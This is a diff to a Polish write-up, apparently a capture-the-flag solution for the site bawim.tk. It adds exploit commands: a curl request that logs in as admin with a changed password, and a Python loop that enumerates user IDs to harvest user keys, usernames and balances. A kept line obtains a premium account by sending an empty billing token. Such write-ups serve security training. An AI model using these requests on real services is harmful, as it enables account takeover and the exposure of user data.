@@ -60,8 +60,28 @@ parametry: key, billing_token, json - ten endpoint obsługuje dane wejściowe w 
     return token
   ```
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d new_password=<wpisz_nowe_hasło_admina> https://bawim.tk/set_password/386/yKW@n3UoT5n@xU5n@xUu.s
+  curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d password=<wpisz_nowe_hasło_admina> https://bawim.tk/login/admin
   
-  
+  ```python
+   # Znajdywanie użytkownika, który ma na koncie $1.000.000
+  import requests, json
+
+  i=0
+  while True:
+      text = requests.post(f'https://bawim.tk/user/{i}', data={"key": "Re2LPGUMEKa34ik1uhHOBMoc"}).text
+      json_data = json.loads(text)
+      user_key = json_data['user_key']
+
+      text = requests.post(f'https://bawim.tk/user_data/{i}', data={"key": "Re2LPGUMEKa34ik1uhHOBMoc", "user_key": user_key}).text
+      json_data = json.loads(text)
+      money = json_data['money_amount']
+      username = json_data['username']
+      print(username, money)
+
+      if(money == "1000000"): break
+      i+=1
+ 
+```
   curl -i -X POST -d key=Re2LPGUMEKa34ik1uhHOBMoc -d json={\"billing_token\":[]} http://bawim.tk/set_premium_account/200  
   
 </details>
